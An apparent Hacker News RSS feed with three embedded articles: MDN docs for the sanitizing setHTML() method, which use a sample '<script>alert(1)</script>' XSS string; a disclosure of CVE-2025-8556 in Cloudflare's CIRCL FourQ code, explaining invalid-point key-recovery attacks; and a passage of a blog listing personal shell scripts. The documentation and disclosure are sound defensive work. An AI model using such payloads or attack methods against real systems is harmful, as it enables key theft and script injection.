<?xml version='1.0' encoding='UTF-8'?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><id>hnrss.org/frontpage</id><title>Hacker News: Front Page</title><updated>2025-10-23T06:15:42.281463+00:00</updated><link href="https://news.ycombinator.com/" rel="alternate"/><link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml" rel="self"/><generator uri="https://lkiesow.github.io/python-feedgen" version="1.0.0">python-feedgen</generator><subtitle>Hacker News RSS</subtitle><entry><id>https://news.ycombinator.com/item?id=45666497</id><title>Element: setHTML() method</title><updated>2025-10-23T06:15:50.955968+00:00</updated><content>&lt;doc fingerprint="3c07f111bb1f8bd0"&gt;
  &lt;main&gt;&lt;head rend="h1"&gt;Element: setHTML() method&lt;/head&gt;&lt;head&gt; Limited availability &lt;/head&gt;&lt;p&gt;This feature is not Baseline because it does not work in some of the most widely-used browsers.&lt;/p&gt;&lt;p&gt;Experimental: This is an experimental technology&lt;lb/&gt;Check the Browser compatibility table carefully before using this in production.&lt;/p&gt;&lt;p&gt;The &lt;code&gt;setHTML()&lt;/code&gt; method of the &lt;code&gt;Element&lt;/code&gt; interface provides an XSS-safe method to parse and sanitize a string of HTML into a &lt;code&gt;DocumentFragment&lt;/code&gt;, and then insert it into the DOM as a subtree of the element.&lt;/p&gt;&lt;head rend="h2"&gt;Syntax&lt;/head&gt;&lt;code&gt;setHTML(input)
setHTML(input, options)
&lt;/code&gt;&lt;head rend="h3"&gt;Parameters&lt;/head&gt;&lt;list rend="dl"&gt;&lt;item rend="dt-1"&gt;&lt;code&gt;input&lt;/code&gt;&lt;/item&gt;&lt;item rend="dd-1"&gt;&lt;p&gt;A string defining HTML to be sanitized and injected into the element.&lt;/p&gt;&lt;/item&gt;&lt;item rend="dt-2"&gt;&lt;code&gt;options&lt;/code&gt;Optional&lt;/item&gt;&lt;item rend="dd-2"&gt;&lt;p&gt;An options object with the following optional parameters:&lt;/p&gt;&lt;list rend="dl"&gt;&lt;item rend="dt-3"&gt;&lt;code&gt;sanitizer&lt;/code&gt;&lt;/item&gt;&lt;item rend="dd-3"&gt;&lt;p&gt;A&lt;/p&gt;&lt;code&gt;Sanitizer&lt;/code&gt;or&lt;code&gt;SanitizerConfig&lt;/code&gt;object which defines what elements of the input will be allowed or removed, or the string&lt;code&gt;"default"&lt;/code&gt;for the default configuration. Note that generally a&lt;code&gt;"Sanitizer&lt;/code&gt;is expected to be more efficient than a&lt;code&gt;SanitizerConfig&lt;/code&gt;if the configuration is to reused. If not specified, the default sanitizer configuration is used.&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;&lt;/list&gt;&lt;head rend="h3"&gt;Return value&lt;/head&gt;&lt;p&gt;None (&lt;code&gt;undefined&lt;/code&gt;).&lt;/p&gt;&lt;head rend="h3"&gt;Exceptions&lt;/head&gt;&lt;list rend="dl"&gt;&lt;item rend="dt-1"&gt;&lt;code&gt;TypeError&lt;/code&gt;&lt;/item&gt;&lt;item rend="dd-1"&gt;&lt;p&gt;This is thrown if&lt;/p&gt;&lt;code&gt;options.sanitizer&lt;/code&gt;is passed a:&lt;list rend="ul"&gt;&lt;item&gt;non-normalized &lt;code&gt;SanitizerConfig&lt;/code&gt;(one that includes both "allowed" and "removed" configuration settings).&lt;/item&gt;&lt;item&gt;string that does not have the value &lt;code&gt;"default"&lt;/code&gt;.&lt;/item&gt;&lt;item&gt;value that is not a &lt;code&gt;Sanitizer&lt;/code&gt;,&lt;code&gt;SanitizerConfig&lt;/code&gt;, or string.&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;&lt;item&gt;non-normalized &lt;/item&gt;&lt;/list&gt;&lt;head rend="h2"&gt;Description&lt;/head&gt;&lt;p&gt;The &lt;code&gt;setHTML()&lt;/code&gt; method provides an XSS-safe method to parse and sanitize a string of HTML into a &lt;code&gt;DocumentFragment&lt;/code&gt;, and then insert it into the DOM as a subtree of the element.&lt;/p&gt;&lt;p&gt;&lt;code&gt;setHTML()&lt;/code&gt; drops any elements in the HTML input string that are invalid in the context of the current element, such as a &lt;code&gt;&amp;lt;col&amp;gt;&lt;/code&gt; element outside of a &lt;code&gt;&amp;lt;table&amp;gt;&lt;/code&gt;.
It then removes any HTML entities that aren't allowed by the sanitizer configuration, and further removes any XSS-unsafe elements or attributes Ã¢ whether or not they are allowed by the sanitizer configuration.&lt;/p&gt;&lt;p&gt;If no sanitizer configuration is specified in the &lt;code&gt;options.sanitizer&lt;/code&gt; parameter, &lt;code&gt;setHTML()&lt;/code&gt; is used with the default &lt;code&gt;Sanitizer&lt;/code&gt; configuration.
This configuration allows all elements and attributes that are considered XSS-safe, thereby disallowing entities that are considered unsafe.
A custom sanitizer or sanitizer configuration can be specified to choose which elements, attributes, and comments are allowed or removed.
Note that even if unsafe options are allowed by the sanitizer configuration, they will still be removed when using this method (which implicitly calls &lt;code&gt;Sanitizer.removeUnsafe()&lt;/code&gt;).&lt;/p&gt;&lt;p&gt;&lt;code&gt;setHTML()&lt;/code&gt; should be used instead of &lt;code&gt;Element.innerHTML&lt;/code&gt; for inserting untrusted strings of HTML into an element.
It should also be used instead of &lt;code&gt;Element.setHTMLUnsafe()&lt;/code&gt;, unless there is a specific need to allow unsafe elements and attributes.&lt;/p&gt;&lt;p&gt;Note that since this method always sanitizes input strings of XSS-unsafe entities, it is not secured or validated using the Trusted Types API.&lt;/p&gt;&lt;head rend="h2"&gt;Examples&lt;/head&gt;&amp;gt;&lt;head rend="h3"&gt;Basic usage&lt;/head&gt;&lt;p&gt;This example shows some of the ways you can use &lt;code&gt;setHTML()&lt;/code&gt; to sanitize and inject a string of HTML.&lt;/p&gt;&lt;code&gt;// Define unsanitized string of HTML
const unsanitizedString = "abc &amp;lt;script&amp;gt;alert(1)&amp;lt;" + "/script&amp;gt; def";
// Get the target Element with id "target"
const target = document.getElementById("target");

// setHTML() with default sanitizer
target.setHTML(unsanitizedString);

// Define custom Sanitizer and use in setHTML()
// This allows only elements: div, p, button (script is unsafe and will be removed)
const sanitizer1 = new Sanitizer({
  elements: ["div", "p", "button", "script"],
});
target.setHTML(unsanitizedString, { sanitizer: sanitizer1 });

// Define custom SanitizerConfig within setHTML()
// This removes elements div, p, button, script, and any other unsafe elements/attributes
target.setHTML(unsanitizedString, {
  sanitizer: { removeElements: ["div", "p", "button", "script"] },
});
&lt;/code&gt;&lt;head rend="h3"&gt;&lt;code&gt;setHTML()&lt;/code&gt; live example&lt;/head&gt;&lt;p&gt;This example provides a "live" demonstration of the method when called with different sanitizers. The code defines buttons that you can click to sanitize and inject a string of HTML using a default and a custom sanitizer, respectively. The original string and sanitized HTML are logged so you can inspect the results in each case.&lt;/p&gt;&lt;head rend="h4"&gt;HTML&lt;/head&gt;&lt;p&gt;The HTML defines two &lt;code&gt;&amp;lt;button&amp;gt;&lt;/code&gt; elements for applying different sanitizers, another button to reset the example, and a &lt;code&gt;&amp;lt;div&amp;gt;&lt;/code&gt; element to inject the string into.&lt;/p&gt;&lt;code&gt;&amp;lt;button id="buttonDefault" type="button"&amp;gt;Default&amp;lt;/button&amp;gt;
&amp;lt;button id="buttonAllowScript" type="button"&amp;gt;allowScript&amp;lt;/button&amp;gt;

&amp;lt;button id="reload" type="button"&amp;gt;Reload&amp;lt;/button&amp;gt;
&amp;lt;div id="target"&amp;gt;Original content of target element&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;head rend="h4"&gt;JavaScript&lt;/head&gt;&lt;p&gt;First we define the string to sanitize, which will be the same for all cases. This contains the &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; element and the &lt;code&gt;onclick&lt;/code&gt; handler, both of which are considered XSS-unsafe.
We also define the handler for the reload button.&lt;/p&gt;&lt;code&gt;// Define unsafe string of HTML
const unsanitizedString = `
  &amp;lt;div&amp;gt;
    &amp;lt;p&amp;gt;This is a paragraph. &amp;lt;button onclick="alert('You clicked the button!')"&amp;gt;Click me&amp;lt;/button&amp;gt;&amp;lt;/p&amp;gt;
    &amp;lt;script src="path/to/a/module.js" type="module"&amp;gt;&amp;lt;script&amp;gt;
  &amp;lt;/div&amp;gt;
`;

const reload = document.querySelector("#reload");
reload.addEventListener("click", () =&amp;gt; document.location.reload());
&lt;/code&gt;&lt;p&gt;Next we define the click handler for the button that sets the HTML with the default sanitizer. This should strip out all unsafe entities before inserting the string of HTML. Note that you can see exactly which elements are removed in the &lt;code&gt;Sanitizer()&lt;/code&gt; constructor examples.&lt;/p&gt;&lt;code&gt;const defaultSanitizerButton = document.querySelector("#buttonDefault");
defaultSanitizerButton.addEventListener("click", () =&amp;gt; {
  // Set the content of the element using the default sanitizer
  target.setHTML(unsanitizedString);

  // Log HTML before sanitization and after being injected
  logElement.textContent =
    "Default sanitizer: remove script element and onclick attribute\n\n";
  log(`\nunsanitized: ${unsanitizedString}`);
  log(`\nsanitized: ${target.innerHTML}`);
});
&lt;/code&gt;&lt;p&gt;The next click handler sets the target HTML using a custom sanitizer that allows only &lt;code&gt;&amp;lt;div&amp;gt;&lt;/code&gt;, &lt;code&gt;&amp;lt;p&amp;gt;&lt;/code&gt;, and &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; elements.
Note that because we're using the &lt;code&gt;setHTML&lt;/code&gt; method, &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; will also be removed!&lt;/p&gt;&lt;code&gt;const allowScriptButton = document.querySelector("#buttonAllowScript");
allowScriptButton.addEventListener("click", () =&amp;gt; {
  // Set the content of the element using a custom sanitizer
  const sanitizer1 = new Sanitizer({
    elements: ["div", "p", "script"],
  });
  target.setHTML(unsanitizedString, { sanitizer: sanitizer1 });

  // Log HTML before sanitization and after being injected
  logElement.textContent =
    "Sanitizer: {elements: ['div', 'p', 'script']}\n Script removed even though allowed\n";
  log(`\nunsanitized: ${unsanitizedString}`);
  log(`\nsanitized: ${target.innerHTML}`);
});
&lt;/code&gt;&lt;head rend="h4"&gt;Results&lt;/head&gt;&lt;p&gt;Click the "Default" and "allowScript" buttons to see the effects of the default and custom sanitizer, respectively. Note that in both cases the &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; element and &lt;code&gt;onclick&lt;/code&gt; handler are removed, even if explicitly allowed by the sanitizer.&lt;/p&gt;&lt;head rend="h2"&gt;Specifications&lt;/head&gt;&lt;table&gt;&lt;row&gt;&lt;cell role="head"&gt;Specification&lt;/cell&gt;&lt;/row&gt;&lt;row&gt;&lt;cell&gt;HTML Sanitizer API&amp;gt;&lt;p&gt;# dom-element-sethtml&amp;gt;&lt;/p&gt;&lt;/cell&gt;&lt;/row&gt;&lt;/table&gt;&lt;head rend="h2"&gt;Browser compatibility&lt;/head&gt;&lt;p&gt;LoadingÃ¢Â¦&lt;/p&gt;&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://developer.mozilla.org/en-US/docs/Web/API/Element/setHTML"/><published>2025-10-22T09:03:40+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45669593</id><title>Cryptographic Issues in Cloudflare's Circl FourQ Implementation (CVE-2025-8556)</title><updated>2025-10-23T06:15:50.689423+00:00</updated><content>&lt;doc fingerprint="9496d8d5822123c5"&gt;
  &lt;main&gt;
    &lt;p&gt;In early 2025, while working on a project which required us to perform a broad audit of OSS elliptic curve implementations Ã¢ we discovered several cryptographic issues in Cloudflare's CIRCL library Ã¢ specifically with the implementation of the FourQ elliptic curve.&lt;/p&gt;
    &lt;p&gt;We reported the issues through Cloudflare's HackerOne bug bounty plan in March 2025, and subsequently contacted Cloudflare directly, after having received a lukewarm and laconic response from the HackerOne triage team.&lt;/p&gt;
    &lt;p&gt;Once the team at Cloudflare stepped in the issues were appropriately acknowledged and fixed.&lt;/p&gt;
    &lt;p&gt; CIRCL, which is Cloudflare's cryptography library, offers a basic implementation of the FourQ curve, as well as a Diffie-Hellman implementation named &lt;code&gt;Curve4Q&lt;/code&gt; which offers shared secret functionality.
  &lt;/p&gt;
    &lt;p&gt;FourQ is an elliptic curve with 128-bit security, developed by Microsoft Research and is defined by a twisted Edwards curve equation.&lt;/p&gt;
    &lt;p&gt;The curve is defined over a two-dimensional extension of the prime field defined by the Mersenne prime \(p = 2^{127} - 1\), the curve twist parameter \(a = -1\) and \(d\) set to a quadratic nonresidue in \(F_{p^2}\).&lt;/p&gt;
    &lt;p&gt;Simply put, much like the complex numbers are an extension field of the real numbers Ã¢ the FourQ curve is defined over an extension of a prime field, its elements being of the form \(a + bi\) where \(a\) and \(b\) are in the integers\(\mod p\).&lt;/p&gt;
    &lt;p&gt;In addition, the FourQ curve defines two endomorphisms, or structure-preserving functions, which serve as "shortcuts" to perform computations on the curve more efficiently.&lt;/p&gt;
    &lt;p&gt;These endomorphisms, along with the other characteristics of the FourQ curve, make it fast and suitable for use-cases where computational resources are scarce Ã¢ such as in embedded systems.&lt;/p&gt;
    &lt;p&gt;A certain class of attacks on elliptic curve implementations allows an attacker to force the server to perform a calculation which discloses information about the secret key used.&lt;/p&gt;
    &lt;p&gt;This type of attack is often called an invalid curve or invalid point attack, and stems from insufficient validation of the points used to perform the calculation.&lt;/p&gt;
    &lt;p&gt;Elliptic Curve Diffie-Hellman or ECDH involves each side taking a secret scalar \(k\) and multiplying it with a fixed generator point \(G\) to compute the point \(Q = k*G\). Each side transmits its \(Q\) point, and receives the other side's \(Q\) point, multiplying it by his own \(k\) scalar. Since scalar multiplication in elliptic curves is commutative Ã¢ both sides will end up with the same point.&lt;/p&gt;
    &lt;code&gt;
 // Shared calculates a shared key k from Alice's secret and Bob's public key.
// Returns true on success.
func Shared(shared, secret, public *Key) bool {
    var P, Q fourq.Point
    ok := P.Unmarshal((*[Size]byte)(public))
    Q.ScalarMult((*[Size]byte)(secret), &amp;amp;P)
    Q.Marshal((*[Size]byte)(shared))
    ok = ok &amp;amp;&amp;amp; Q.IsOnCurve()
    return ok
}

  &lt;/code&gt;
    &lt;p&gt; An example from CIRCL's &lt;code&gt;Curve4Q&lt;/code&gt; implementation (pre-remediation), shows a shared secret being calculated, by taking as input a public point (&lt;code&gt;P&lt;/code&gt;) and a secret scalar, and multiplying them.
  &lt;/p&gt;
    &lt;p&gt; The issue arises when the computation is done without first verifying that the other side's point is a valid point on the curve. The reason is that in order to be secure Ã¢ all points on an elliptic curve must be members of an \(N\)-torsion subgroup, where \(N\) is the order of the curve Ã¢ the total amount of points on the curve.&lt;lb/&gt; Put more clearly Ã¢ if we consider a point being added to itself a "step", then every point on the curve should have the same amount of "steps" required to lead back to the identity point, or the "starting" point. &lt;/p&gt;
    &lt;p&gt;Meaning if one multiplies a certain point \(Q\) by the secret scalar \(k\), if the point is valid and on the expected curve, the result should land in any of the \(N\) points on the curve. For the curve to be considered secure, it must have an order \(N\) which is either a prime number, or composed from a large prime number and a small cofactor.&lt;/p&gt;
    &lt;p&gt;This is what makes the discrete logarithm problem difficult with regards to scalar multiplication, thus creating a "trap-door" function where it is easy to perform the multiplication, but hard to reverse it.&lt;/p&gt;
    &lt;p&gt;If an attacker is able to force the server to perform the scalar multiplication of his secret \(k\) with an invalid point \(\widehat{Q}\) which is not on the curve Ã¢ he may choose \(\widehat{Q}\) such that it belongs to a curve with a smooth (composed of many small factors) subgroup order \(\widehat{N}\).&lt;/p&gt;
    &lt;p&gt; As a result Ã¢ instead of \(k*Q\) computing any possible point on the original curve, it will instead land in any of a smaller set of points.&lt;lb/&gt; For instance, the subgroup order of \(\widehat{Q}\) is only 400 points, the attacker will be able to trivially brute-force 400 values of \(k\) to find the server's secret \(k\) value, modulo 400. &lt;/p&gt;
    &lt;p&gt;If repeated for multiple invalid points, with different subgroup orders, and in combination with the Chinese Remainder Theorem, the attacker will eventually be able to extract the server's secret \(k\) value.&lt;/p&gt;
    &lt;p&gt;The above attack is applicable on a form of elliptic curves called Weierstrass curves. While Edwards curves are birationally equivalent to Weierstrass curves, meaning a curve such as FourQ may be represented using Weierstrass formulas Ã¢ the invalid curve attack as presented in the previous section does not generalize to Edwards curve.&lt;/p&gt;
    &lt;p&gt;Weierstrass addition (xÃ¢ != xÃ¢):&lt;/p&gt;
    &lt;p&gt;\[ \lambda = \frac{y_2 - y_1}{x_2 - x_1} \]&lt;/p&gt;
    &lt;p&gt;\[ x_3 = \lambda^2 - x_1 - x_2 \]&lt;/p&gt;
    &lt;p&gt;\[ y_3 = \lambda (x_1 - x_3) - y_1 \]&lt;/p&gt;
    &lt;p&gt;Edwards addition:&lt;/p&gt;
    &lt;p&gt;\[ x_3 = \frac{x_1 y_2 + y_1 x_2}{1 + d x_1 x_2 y_1 y_2} \]&lt;/p&gt;
    &lt;p&gt;\[ y_3 = \frac{y_1 y_2 - a x_1 x_2}{1 - d x_1 x_2 y_1 y_2} \]&lt;/p&gt;
    &lt;p&gt;The reason for this is that while addition using the Weierstrass formulas is independent of the curve parameters, Edwards addition formulas are dependent on both curve parameters \(a\) and \(d\), which makes it impossible (or more accurately very difficult) to pass arbitrary points, i.e. points which are not on the curve and have the server perform addition on them correctly.&lt;/p&gt;
    &lt;p&gt;If we take a closer look at the Edwards addition formula, we see that the curve parameters (\(a\) and \(d\)) are coefficients of the \(x\) variable Ã¢ meaning if we affix \(x\) to 0, the curve parameters cancel out and we are left with a less generalized invalid point attack which does work on all Edwards curves.&lt;/p&gt;
    &lt;p&gt;Concretely Ã¢ if we pass in a point of form \((0, y)\), the result of multiplying it by the secret value \(k\) computes \((0, y^k)\). As such, if we select an appropriate \(y\) value such that the point \((0, y)\) has a small multiplicative subgroup order, and receive the value \((0, y^k)\) Ã¢ solving the discrete logarithm problem to recover \(k\) becomes trivial.&lt;/p&gt;
    &lt;p&gt;In consideration of the invalid curve attacks presented above, the main adversarial threat to ECC implementation lies with performing computations on invalid points Ã¢ points which are not on the graph. As such Ã¢ points should always be validated before being relied upon for any computation.&lt;/p&gt;
    &lt;p&gt;At minimum, the process of unmarshalling a point, meaning loading an appropriate length byte-array and converting it to a point on the curve Ã¢ should ensure that the point loaded is indeed a valid point on the curve Ã¢ simply by checking if the curve equation holds.&lt;/p&gt;
    &lt;p&gt;For added security Ã¢ the point should also be validated before being used in any of the basic computations Ã¢ addition, doubling/scalar multiplication.&lt;/p&gt;
    &lt;p&gt;While auditing CIRCL's FourQ implementation we pinpointed 7 total issues related to these security primitives, as well as to the testing code Ã¢ which incorrectly demonstrated some security proofs.&lt;/p&gt;
    &lt;p&gt;Below is a short description of the 4 major points we raised, and were to some extent addressed by the fixes to CIRCL.&lt;/p&gt;
    &lt;code&gt;Point.Unmarshal&lt;/code&gt;
    &lt;p&gt;The issue here is a missing step Ã¢ the IETF spec for FourQ accounts for some ambiguity in the unmarshalling process by conjugating the point's \(x\) value Ã¢ if not the unmarshalled point nor its conjugate are valid points on the curve Ã¢ the unmarshalled point is invalid.&lt;/p&gt;
    &lt;p&gt;The IETF spec contains the following pseudocode:&lt;/p&gt;
    &lt;quote&gt;if -x^2+y^2 != 1+d*x^2*y^2: # Check curve equation with x x = conj(x) if -x^2+y^2 != 1+d*x^2*y^2: # ... or its conjugate return FAILED return P = (x,y)&lt;/quote&gt;
    &lt;p&gt;The CIRCL implementation fails to re-validate the point being on the curve after conjugating its \(x\) value:&lt;/p&gt;
    &lt;quote&gt;if !P.IsOnCurve() { fpNeg(&amp;amp;P.X[1], &amp;amp;P.X[1]) } return true&lt;/quote&gt;
    &lt;code&gt;pointR1.isEqual&lt;/code&gt;
    &lt;p&gt;The CIRCL code, as per the IETF spec, uses several representations of projected coordinates Ã¢ this means that in addition to the \(x\) and \(y\) value, each point also has an additional \(Z\), \(Ta\) and \(Tb\) values, where \(Z * Ta * Tb \equiv x * y\).&lt;/p&gt;
    &lt;p&gt; The issue here is that if \(Z\) is set to 0 Ã¢ which is invalid in the context of the projected representation Ã¢ the &lt;code&gt;isEqual&lt;/code&gt; check always returns true.
  &lt;/p&gt;
    &lt;p&gt;Several checks in the code were affected by the issue, including faulty tests.&lt;/p&gt;
    &lt;code&gt;pointR1.ClearCofactor&lt;/code&gt;
    &lt;p&gt; Since the FourQ curve has a cofactor of 392 Ã¢ meanings its order is not a prime number but rather a prime number multiplied by 392 Ã¢ in order to ensure that the point being used for computation is an \(N\)-torsion point, the cofactor must be cleared by multiplying the point by 392 prior to any additional scalar multiplications.&lt;lb/&gt; If we end up with the neutral point as a result of clearing the cofactor Ã¢ the input point is invalid. &lt;/p&gt;
    &lt;p&gt;The CIRCL implementation deviates from the spec by failing to perform this verification after clearing the cofactor.&lt;/p&gt;
    &lt;code&gt;pointR1.ScalarMult&lt;/code&gt;
    &lt;p&gt; The scalar multiplication implementation on &lt;code&gt;pointR1&lt;/code&gt; assumes that the projected values are valid, and that the point is indeed on the curve.&lt;lb/&gt; As a result of the previous issue with unmarshalling, it's as possible to load a point which isn't on the curve, and then perform computations on it, which exposes the implementation to the degenerate curve attacks described above. &lt;/p&gt;
    &lt;p&gt; Fixing the unmarshalling issue prevents this issue, as does the change to the code in &lt;code&gt;Curve4Q&lt;/code&gt; which performs the DH computation.&lt;lb/&gt; However, in order to conform with more stringent security measures, it would be advisable to validate that the input point is on the curve prior to performing the scalar multiplication. &lt;/p&gt;
    &lt;p&gt;Botanica Technologies Ltd.&lt;lb/&gt;47 Sheinkin St, Tel Aviv-Yafo, Israel&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.botanica.software/blog/cryptographic-issues-in-cloudflares-circl-fourq-implementation"/><published>2025-10-22T14:22:41+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45670052</id><title>Scripts I wrote that I use all the time</title><updated>2025-10-23T06:15:50.354869+00:00</updated><content>&lt;doc fingerprint="2b0d9d56290502bd"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Scripts I wrote that I use all the time&lt;/head&gt;
    &lt;p&gt;In my decade-plus of maintaining my dotfiles, Iâve written a lot of little shell scripts. Hereâs a big list of my personal favorites.&lt;/p&gt;
    &lt;head rend="h2"&gt;Clipboard&lt;/head&gt;
    &lt;p&gt;&lt;code&gt;copy&lt;/code&gt; and &lt;code&gt;pasta&lt;/code&gt; are simple wrappers around system clipboard managers, like &lt;code&gt;pbcopy&lt;/code&gt; on macOS and &lt;code&gt;xclip&lt;/code&gt; on Linux. I use these all the time.&lt;/p&gt;
    &lt;code&gt;# High level examples
run_some_command | copy
pasta &amp;gt; file_from_my_clipboard.txt

# Copy a file's contents
copy &amp;lt; file.txt

# Open a file path from your clipboard
vim "$(pasta)"

# Decode some base64 from the clipboard
pasta | base64 --decode
&lt;/code&gt;
    &lt;p&gt;&lt;code&gt;pastas&lt;/code&gt; prints the current state of your clipboard to stdout, and then whenever the clipboard changes, it prints the new version. I use this once a week or so.&lt;/p&gt;
    &lt;code&gt;# High level example
pastas &amp;gt; everything_i_copied.txt

# Download every link I copy to my clipboard
pastas | wget -i -
&lt;/code&gt;
    &lt;p&gt;&lt;code&gt;cpwd&lt;/code&gt; copies the current directory to the clipboard. Basically &lt;code&gt;pwd | copy&lt;/code&gt;. I often use this when Iâm in a directory and I want use that directory in another terminal tab; I copy it in one tab and &lt;code&gt;cd&lt;/code&gt; to it in another. I use this once a day or so.&lt;/p&gt;
    &lt;head rend="h2"&gt;File management&lt;/head&gt;
    &lt;p&gt;&lt;code&gt;mkcd foo&lt;/code&gt; makes a directory and &lt;code&gt;cd&lt;/code&gt;s inside. Itâs basically &lt;code&gt;mkdir foo &amp;amp;&amp;amp; cd foo&lt;/code&gt;. I use this all the timeâalmost every time I make a directory, I want to go in there.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;tempe&lt;/code&gt; changes to a temporary directory. Itâs basically &lt;code&gt;cd "$(mktemp -d)"&lt;/code&gt;. I use this all the time to hop into a sandbox directory. It saves me from having to manually clean up my work. A couple of common examples:&lt;/p&gt;
    &lt;code&gt;# Download a file and extract it
tempe
wget 'https://example.com/big_file.tar.xz'
tar -xf big_file.tar.xz
# ...do something with the file...

# Write a quick throwaway script to try something out
tempe
vim foo.py
python3 foo.py
&lt;/code&gt;
    &lt;p&gt;&lt;code&gt;trash a.txt b.png&lt;/code&gt; moves &lt;code&gt;a.txt&lt;/code&gt; and &lt;code&gt;b.png&lt;/code&gt; to the trash. Supports macOS and Linux. I use this every day. I definitely run it more than &lt;code&gt;rm&lt;/code&gt;, and it saves me from accidentally deleting files.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;mksh&lt;/code&gt; makes it quick to create shell scripts. &lt;code&gt;mksh foo.sh&lt;/code&gt; creates &lt;code&gt;foo.sh&lt;/code&gt;, makes it executable with &lt;code&gt;chmod u+x&lt;/code&gt;, adds some nice Bash prefixes, and opens it with my editor (Vim in my case). I use this every few days. Many of the scripts in this post were made with this helper!&lt;/p&gt;
    &lt;head rend="h2"&gt;Internet&lt;/head&gt;
    &lt;p&gt;&lt;code&gt;serveit&lt;/code&gt; starts a static file server on &lt;code&gt;localhost:8000&lt;/code&gt; in the current directory. Itâs basically &lt;code&gt;python3 -m http.server 8000&lt;/code&gt; but handles cases where Python isnât installed, falling back to other programs. I use this a few times a week. Probably less useful if youâre not a web developer.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;getsong&lt;/code&gt; uses &lt;code&gt;yt-dlp&lt;/code&gt; to download songs, often from YouTube or SoundCloud, in the highest available quality. For example, &lt;code&gt;getsong https://www.youtube.com/watch?v=dQw4w9WgXcQ&lt;/code&gt; downloads that video as a song. I use this a few times a week&amp;amp;mldr;typically to grab video game soundtracks&amp;amp;mldr;&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;getpod&lt;/code&gt; similarly uses &lt;code&gt;yt-dlp&lt;/code&gt; to download something for a podcast player. There are a lot of videos that Iâd rather listen to like a podcast. I use this a few times a month.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;getsubs&lt;/code&gt; downloads the English subtitles for a video. (Thereâs some fanciness to look for âofficialâ subtitles, falling back to auto-generated subtitles.) Sometimes I read the subtitles manually, sometimes I run &lt;code&gt;getsubs https://video.example/foo | ollama run llama3.2 "Summarize this"&lt;/code&gt;, sometimes I just want it as a backup of a video I donât want to save on my computer. I use this every few days.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;wifi off&lt;/code&gt;, &lt;code&gt;wifi on&lt;/code&gt;, and &lt;code&gt;wifi toggle&lt;/code&gt; are useful for controlling my systemâs wifi. &lt;code&gt;wifi toggle&lt;/code&gt; is the one I use most often, when Iâm having network trouble. I use this about once a month.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;url "$my_url"&lt;/code&gt; parses a URL into its parts. I use this about once a month to pull data out of a URL, often because I donât want to click a nasty tracking link.&lt;/p&gt;
    &lt;code&gt;url 'https://evil.example/track-user-link?url=https%3A%2F%2Furl-i-want-to-visit.example&amp;amp;track=06f8582a-91e6-4c9c-bf8e-516884584aba#cookie=123'
# original: https://evil.example/track-user-link?url=https%3A%2F%2Furl-i-want-to-visit.example&amp;amp;track=06f8582a-91e6-4c9c-bf8e-516884584aba#cookie=123
# protocol: https
# hostname: evil.example
# path: /track-user-link
# query: url=https%3A%2F%2Furl-i-want-to-visit.example&amp;amp;track=06f8582a-91e6-4c9c-bf8e-516884584aba
# - url https://url-i-want-to-visit.example
# - track 06f8582a-91e6-4c9c-bf8e-516884584aba
# hash: cookie=123
&lt;/code&gt;
    &lt;head rend="h2"&gt;Text processing&lt;/head&gt;
    &lt;p&gt;&lt;code&gt;line 10&lt;/code&gt; prints line 10 from stdin. For example, &lt;code&gt;cat some_big_file | line 10&lt;/code&gt; prints line 10 of a file. This feels like one of those things that should be built in, like &lt;code&gt;head&lt;/code&gt; and &lt;code&gt;tail&lt;/code&gt;. I use this about once a month.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;scratch&lt;/code&gt; opens a temporary Vim buffer. Itâs basically an alias for &lt;code&gt;$EDITOR $(mktemp)&lt;/code&gt;. I use this about once a day for quick text manipulation tasks, or to take a little throwaway note.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;straightquote&lt;/code&gt; converts âsmart quotesâ to âstraight quotesâ (sometimes called âdumb quotesâ). I donât care much about these in general, but they sometimes weasel their way into code Iâm working on. It can also make the file size smaller, which is occasionally useful. I use this at least once a week.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;markdownquote&lt;/code&gt; adds &lt;code&gt;&amp;gt;&lt;/code&gt; before every line. I use it in Vim a lot; I select a region and then run &lt;code&gt;:'&amp;lt;,'&amp;gt;!markdownquote&lt;/code&gt; to quote the selection. I use this about once a week.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;length foo&lt;/code&gt; returns &lt;code&gt;3&lt;/code&gt;. (I should probably just use &lt;code&gt;wc -c&lt;/code&gt;.)&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;jsonformat&lt;/code&gt; takes JSON at stdin and pretty-prints it to stdout. I use this a few times a year.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;uppered&lt;/code&gt; and &lt;code&gt;lowered&lt;/code&gt; convert strings to upper and lowercase. For example, &lt;code&gt;echo foo | uppered&lt;/code&gt; returns &lt;code&gt;FOO&lt;/code&gt;. I use these about once a week.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;nato bar&lt;/code&gt; returns &lt;code&gt;Bravo Alfa Romeo&lt;/code&gt;. I use this most often when talking to customer service and need to read out a long alphanumeric string, which has only happened a couple of times in my whole life. But itâs sometimes useful!&lt;/p&gt;
